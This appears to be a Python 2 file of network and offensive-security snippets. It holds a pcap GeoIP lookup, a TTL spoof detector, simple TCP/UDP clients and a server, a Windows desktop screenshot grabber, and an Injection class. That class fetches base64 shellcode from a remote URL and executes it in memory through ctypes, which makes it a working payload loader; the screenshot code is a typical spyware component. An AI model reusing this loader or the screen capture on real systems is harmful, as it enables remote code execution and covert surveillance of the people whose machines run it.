# database 				=> http://geolite.maxmind.com/download/geoip/database/GeoLiteCity.dat.gz
# pip install pygeoip 	=> this repo deprecated yet still works
# pip install dpkt 		=> packet creation / parsing, with definitions for the basic TCP/IP protocols
# pip install scapy		=> packet creation / parsing
# pip install IPy		=> IPTEST


import pygeoip as pg
import dpkt
import socket
from scapy.all import *
from IPy import IP as IPTEST


GEO_IP_DATABASE_URL = '/opt/geoip/Geo.dat'
MAX_HOP_DIFFERENCE = 5 # threshold for ttl difference


def getIpInfo(targetIp):
    return pg.GeoIP(GEO_IP_DATABASE_URL).record_by_name(targetIp)


def analysePcap(pcapFilePath):
    pcapFileHandler = open(pcapFilePath)
    pcapInfo = dpkt.pcap.Reader(pcapFileHandler)
    for (timestamp, packet) in pcapInfo:
        try:
            eth = dpkt.ethernet.Ethernet(packet) # physical and data link layers
            ip = eth.data
            source = socket.inet_ntoa(ip.src)
            destination = socket.inet_ntoa(ip.dst)
            ipInfoSrc = getIpInfo(source)
            ipInfoDst = getIpInfo(destination)

            print 'From: ' + source + ' to: ' + destination + '\n'
            print ipInfoSrc['city'] + ', ' + ipInfoSrc['country_code3'] + ' --> ' + ipInfoDst['city'] + ', ' + ipInfoDst['country_code3']
            print '---------------------------------------\n'
        except:
            pass


def checkTTL(ipSrc, ttl):
    ttlValues = {}
    if IPTEST(ipSrc).iptype == 'PRIVATE':
        return
    if ipSrc not in ttlValues:
        packet = sr1(IP(dst=ipSrc) / ICMP(), retry=0, timeout=1, verbose=0)
        ttlValues[ipSrc] = packet.ttl
    if abs(int(ttl) - int(ttlValues[ipSrc])) > MAX_HOP_DIFFERENCE:
        print 'Detected possible spoofed packet from: ' + ipSrc
        print 'TTL: ' + ttl + ' Actual TTL: ' + str(ttlValues[ipSrc])


def watchTTL(packet):
    try:
        if packet.haslayer(IP):
            ipSrc = packet.getlayer(IP).src
            ttl = str(packet.ttl)
            checkTTL(ipSrc, ttl)
            # print 'Packet received from: ' + ipSrc + ' with TTL: ' + ttl
    except:
        pass


def simpleTCPClient(host="www.google.com", port=80):
    import socket
    targetHost = host
    targetPort = port

    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect((targetHost, targetPort))
    client.send('GET / HTTP/1.1\nHost: google.com\n\n')
    response = client.recv(4096)

    print response


def simpleUDPClient():
    import socket
    targetHost = "127.0.0.1"
    targetPort = 80
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    client.sendto("AABBTTFFWW", (targetHost, targetPort))

    data, addr = client.recvfrom(4096)

    print data
    print addr


def handleTCPClient(clientSocket):
    request = clientSocket.recv(1024)
    print 'Received: %s' %request

    clientSocket.send('ACK');
    clientSocket.close()


def TCPServer():
    import socket
    import threading
    bindIP = "0.0.0.0"
    bindPort = 9999

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((bindIP, bindPort))
    server.listen(5)

    while True:
        client, addr = server.accept()
        print 'Accepted connection from: %s:%d' %(addr[0], addr[1])

        clientHandler = threading.Thread(target=handleTCPClient, args=(client,))
        clientHandler.start()

class SSManager(object):
    def take_ss(self, pathToSS):
        import win32gui
        import win32ui
        import win32con
        import win32api
        hdesktop = win32gui.GetDesktopWindow()
        width = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
        height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
        left = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
        top = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)
        desktop_dc = win32gui.GetWindowDC(hdesktop)
        img_dc = win32ui.CreateDCFromHandle(desktop_dc)
        mem_dc = img_dc.CreateCompatibleDC()
        screenshot = win32ui.CreateBitmap()
        screenshot.CreateCompatibleBitmap(img_dc, width, height)
        mem_dc.SelectObject(screenshot)
        mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)
        screenshot.SaveBitmapFile(mem_dc, pathToSS)
        mem_dc.DeleteDC()
        win32gui.DeleteObject(screenshot.GetHandle())


class Injection(object):
    def inject(self, shellcode_url):
        import urllib2
        import ctypes
        import base64
        response = urllib2.urlopen(shellcode_url)
        shellcode = base64.b64decode(response.read())
        shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))
        shellcode_func = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p))
        shellcode_func()


def main():
    # {'city': u'Istanbul', 'region_code': u'34', 'area_code': 0, 'time_zone': 'Asia/Istanbul', 'dma_code': 0, 'metro_code': None, 'country_code3': 'TUR', 'latitude': 41.01859999999999, 'postal_code': None, 'longitude': 28.964699999999993, 'country_code': 'TR', 'country_name': 'Turkey', 'continent': 'EU'}
    # print(getIpInfo('212.2.212.131'))
    # sniff(prn=watchTTL, store=0)

    # simpleTCPClient()
    # simpleUDPClient()
    # TCPServer()

if __name__ == '__main__':
    main()
